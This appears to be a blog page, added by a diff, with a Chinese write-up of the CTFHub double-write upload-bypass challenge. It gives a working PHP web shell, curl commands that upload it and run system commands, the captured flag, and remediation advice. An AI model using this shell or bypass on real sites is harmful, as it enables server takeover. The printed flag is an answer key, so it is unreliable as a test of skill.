@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 文件上传 双写绕过 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 文件上传 - 双写绕过</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 文件上传</span>
+            <span class="tag"># 双写绕过</span>
+            <span class="tag"># RCE</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - 双写绕过</li>
+            <li><strong>题目方向：</strong>Web - 文件上传</li>
+            <li><strong>运行环境：</strong>PHP 7.3.14</li>
+            <li><strong>题目目标：</strong>利用非递归关键字删除的缺陷恢复 <code>.php</code> 后缀，上传 Web Shell 并读取 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>首页源码注释泄露了服务端过滤逻辑。程序先提取上传文件名，再使用 <code>str_ireplace()</code> 一次性删除黑名单关键字：</p>
+        <pre>$name = basename($_FILES['file']['name']);
+$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", ...);
+$name = str_ireplace($blacklist, "", $name);</pre>
+        <p><code>str_ireplace()</code> 不会重新检查删除后拼接出的新字符串。将文件名设为 <code>shell.pphphp</code> 时，中间的 <code>php</code> 被删除后，前后剩余的字符会重新组成 <code>php</code>，最终得到 <code>shell.php</code>。</p>
+        <p>服务端随后把文件保存到 Web 可访问的 <code>upload/</code> 目录，并且没有校验文件内容或禁止该目录执行 PHP，因此上传的脚本可以直接执行。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>构造 PHP Payload：</strong>创建内容如下的 <code>shell.txt</code>，通过 <code>c</code> 参数执行系统命令。
+                <pre>&lt;?php system($_GET["c"]); ?&gt;</pre>
+            </li>
+            <li>
+                <strong>使用双写文件名上传：</strong>上传时将文件名指定为 <code>shell.pphphp</code>，服务端删除黑名单关键字后实际保存为 <code>upload/shell.php</code>。
+                <pre>curl -i -F "file=@shell.txt;filename=shell.pphphp" \
+  -F "submit=Submit" \
+  "http://&lt;challenge-host&gt;:10800/"</pre>
+                关键响应内容：
+                <pre>上传文件相对路径
+upload/shell.php</pre>
+            </li>
+            <li>
+                <strong>验证命令执行：</strong>访问 Web Shell，确认脚本以 <code>www-data</code> 身份运行。
+                <pre>curl --get \
+  --data-urlencode "c=id; pwd; ls -la /var/www/html" \
+  "http://&lt;challenge-host&gt;:10800/upload/shell.php"</pre>
+                <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/var/www/html/upload</pre>
+            </li>
+            <li>
+                <strong>定位 Flag 文件：</strong>列出 Web 根目录后看到题目生成的 Flag 文件。
+                <pre>ls -la /var/www/html</pre>
+                <pre>/var/www/html/flag_158805931.php</pre>
+            </li>
+            <li>
+                <strong>读取 Flag：</strong>Flag 位于 PHP 文件的注释中，直接读取源码即可。
+                <pre>cat /var/www/html/flag_158805931.php</pre>
+                <pre>&lt;?php // ctfhub{82c140e7366edb945b831067}</pre>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">ctfhub{82c140e7366edb945b831067}</div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>使用扩展名白名单：</strong>只允许业务需要的安全扩展名，不依赖黑名单过滤，尤其不能只删除关键字。</li>
+            <li><strong>规范化后重复校验：</strong>先归一化文件名，再检查完整扩展名；过滤后必须重新校验最终名称。</li>
+            <li><strong>服务端重命名：</strong>不保留用户可控的文件名和扩展名，由服务端生成随机文件名及固定安全后缀。</li>
+            <li><strong>校验文件内容：</strong>结合文件头、真实内容或文件解析结果判断类型，不能只相信客户端提供的名称。</li>
+            <li><strong>隔离上传目录：</strong>将上传文件存放在 Web 根目录之外，或关闭上传目录的脚本执行权限，并限制 Web 服务账户权限。</li>
+        </ul>
+    </div>
+</body>
+</html>
